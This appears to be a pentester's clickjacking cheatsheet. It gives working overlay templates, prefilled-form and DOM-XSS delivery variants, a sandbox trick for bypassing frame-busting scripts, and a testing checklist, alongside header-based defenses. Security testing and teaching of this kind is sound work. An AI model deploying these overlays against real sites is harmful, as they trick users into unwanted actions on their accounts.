# Clickjacking Cheatsheet

Quick-reference only — assumes you already know the fundamentals (iframe overlay concept, why CSRF tokens don't stop it).

---

## 1. Core Overlay Template

```html
<style>
    iframe {
        position: relative;
        width: $width_value;
        height: $height_value;
        opacity: $opacity;   /* near-invisible, e.g. 0.0001 */
        z-index: 2;          /* on top */
    }
    div {
        position: absolute;
        top: $top_value;
        left: $side_value;
        z-index: 1;          /* decoy underneath */
    }
</style>
<div>Test me</div>
<iframe src="https://target-site/page"></iframe>
```

**Tuning workflow:** start `opacity: 0.5` to align visually → adjust `top`/`left`/`width`/`height` until decoy lines up with real button → drop to `0.0001` for final payload.

**Scaling units:**
| Unit | Use |
|---|---|
| `px` | Precise but breaks across screen sizes |
| `vw` / `vh` | Scales with viewport — apply to **both** target & decoy or alignment breaks |
| `%` | Scales with parent container (parent must also be full-size) |
| `dvw` / `dvh` | Like vw/vh but accounts for mobile browser UI changes — most reliable on mobile |

**Tool shortcut:** Burp's **Clickbandit** — record actions on the target page, auto-generates the overlay HTML.

---

## 2. Attack Variants

| Variant | Technique | Notes |
|---|---|---|
| **Basic click** | Single invisible button over decoy | Tricks one action (e.g. "like", "claim prize") |
| **Prefilled form** | `<iframe src="...?email=attacker@evil.com">` | GET-param prefill + invisible submit → victim unknowingly submits attacker's data |
| **DOM XSS delivery** | Inject payload into a URL param loaded in the iframe, e.g. `name=<img src=1 onerror=print()>` | Clickjacking becomes a *delivery mechanism* for an existing XSS bug — click triggers the payload silently |
| **Multistep** | Multiple decoy divs (`.firstClick`, `.secondClick`, ...) at different coordinates, same iframe reused | Needed when the target action requires a sequence (e.g. delete account → confirm). Verify alignment by hovering each decoy and checking for pointer cursor. |

---

## 3. Bypassing Frame-Busting JS

Old client-side defense (checks `top !== self`, forces frame visibility, blocks clicks). **Bypass:**

```html
<iframe src="https://victim-website.com" sandbox="allow-forms"></iframe>
```
- Include `allow-forms` / `allow-scripts` so the page still functions.
- **Omit** `allow-top-navigation` → framed page can't detect it's inside a frame → self-check defense is blind, page still usable.

Frame busting = band-aid, not a real fix. Don't rely on it appearing as "protection" during testing — verify actual headers instead (below).

---

## 4. Real Defenses & How to Check For Them

| Header | Directive | Meaning |
|---|---|---|
| `X-Frame-Options` | `deny` | No framing allowed |
| `X-Frame-Options` | `sameorigin` | Only same-origin framing |
| `X-Frame-Options` | `allow-from https://site.com` | Legacy, inconsistent browser support — don't rely on alone |
| CSP | `frame-ancestors 'none'` | Equivalent to `deny` |
| CSP | `frame-ancestors 'self'` | Equivalent to `sameorigin` |
| CSP | `frame-ancestors site.com` | Only that domain can frame |

**Check a live target:**
```bash
curl -sI https://example.com | grep -i -E "x-frame-options|content-security-policy"
```
- Headers present → protected.
- **Nothing printed → no clickjacking protection → target is frameable.**

CSP `frame-ancestors` is the current recommended defense (more flexible + covers other attacks too); `X-Frame-Options` as a layered backup.

---

## 5. Testing Checklist

1. `curl -sI` the target, grep for `x-frame-options` / `content-security-policy`. Missing both → likely vulnerable.
2. Confirm framability by loading the page in a basic `<iframe>` test page.
3. Identify the target action (form submit, state-changing button, confirm dialog).
4. Build overlay: align decoy over real button (opacity `0.5` while testing).
5. If a frame-buster script is present, add `sandbox="allow-forms"` (omit `allow-top-navigation`).
6. If a URL param can prefill/trigger something dangerous (data change, stored XSS), weaponize the iframe `src` with that payload.
7. For multi-step flows, stack multiple positioned decoys against the same iframe, verify each with cursor-hover check.
8. Drop opacity to near-zero (`0.0001`) for final PoC.
